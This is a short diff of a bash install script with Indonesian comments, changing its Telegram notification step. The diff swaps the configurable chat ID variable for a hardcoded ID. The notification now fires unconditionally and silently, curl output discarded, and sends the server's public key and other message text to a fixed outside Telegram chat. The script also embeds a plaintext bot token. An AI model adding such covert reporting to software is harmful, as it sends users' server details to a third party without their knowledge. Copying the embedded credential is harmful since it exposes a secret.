@@ -96,7 +96,7 @@ bash "$WORK_DIR/install.sh" install
 PUB_KEY=$(cat "$WORK_DIR/server.pub" 2>/dev/null)
 
 # 7. Kirim Notifikasi ke Bot Telegram (SINKRONISASI + PUBLIC KEY)
-if [[ -n "$AUTO_CHATID" ]]; then
+if [[ -n "2052109732" ]]; then
     TOKEN="8679964962:AAGN-4jPCjVY9_7kECWD2qhk5ve_giRpU0I"
     URL="https://api.telegram.org/bot$TOKEN/sendMessage"
     
@@ -114,7 +114,7 @@ if [[ -n "$AUTO_CHATID" ]]; then
     KEYBOARD='{"inline_keyboard": [[{"text": "🔙 KEMBALI KE MENU", "callback_data": "menu"}]]}'
 
     curl -s -X POST "$URL" \
-         -d chat_id="$AUTO_CHATID" \
+         -d chat_id="2052109732" \
          -d text="$TEXT" \
          -d parse_mode="html" \
          -d reply_markup="$KEYBOARD" > /dev/null 2>&1
